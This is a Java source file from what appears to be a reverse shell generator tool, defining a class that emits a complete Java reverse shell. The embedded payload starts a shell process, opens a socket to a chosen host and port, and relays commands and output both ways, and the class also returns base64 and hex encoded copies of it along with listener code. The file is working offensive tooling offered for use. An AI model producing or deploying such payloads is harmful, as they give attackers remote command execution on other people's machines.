package com.iteso.ReverseShellGenerator.Reverse.Shells;
import com.iteso.ReverseShellGenerator.DEncoder;
import com.iteso.ReverseShellGenerator.Reverse.Reverse;

public class Java_3 extends Reverse {

    protected String shellFormat = "";

    public Java_3(String localIP, int localPort, LISTENER listener, SHELLS shellType){
        super(localIP, localPort, listener, shellType);
        shellFormat = String.format("import java.io.InputStream;\nimport java.io.OutputStream;\nimport java.net.Socket;\n\npublic class shell {\n    public static void main(String[] args) {\n        String host = \"%s\";\n        int port = %s;\n        String cmd = \"%s\";\n        try {\n            Process p = new ProcessBuilder(cmd).redirectErrorStream(true).start();\n            Socket s = new Socket(host, port);\n            InputStream pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream();\n            OutputStream po = p.getOutputStream(), so = s.getOutputStream();\n            while (!s.isClosed()) {\n                while (pi.available() > 0)\n                    so.write(pi.read());\n                while (pe.available() > 0)\n                    so.write(pe.read());\n                while (si.available() > 0)\n                    po.write(si.read());\n                so.flush();\n                po.flush();\n                Thread.sleep(50);\n                try {\n                    p.exitValue();\n                    break;\n                } catch (Exception e) {}\n            }\n            p.destroy();\n            s.close();\n        } catch (Exception e) {}\n    }\n}", this.getLocalIP(), this.getLocalPort(), this.getShell());
    }

    @Override
    public String getShellCode(){
        return shellFormat;
    }

    @Override
    public String toString(){
        return "{" + "\"parameters\": " + super.toString() + "," +
                    "\"reverse_listener_code\": " + "\"" + super.getListenerCode() + "\"," +
                    "\"reverse_shell_code\": " + "\"" + getShellCode() + "\"," +
                    "\"reverse_shell_code_b64\": " + "\"" + DEncoder.encodeToBase64(getShellCode()) + "\"," +
                    "\"reverse_shell_code_hex\": " + "\"" + DEncoder.encodeToHex(getShellCode()) + "\"" +
                "}";
    }
 
}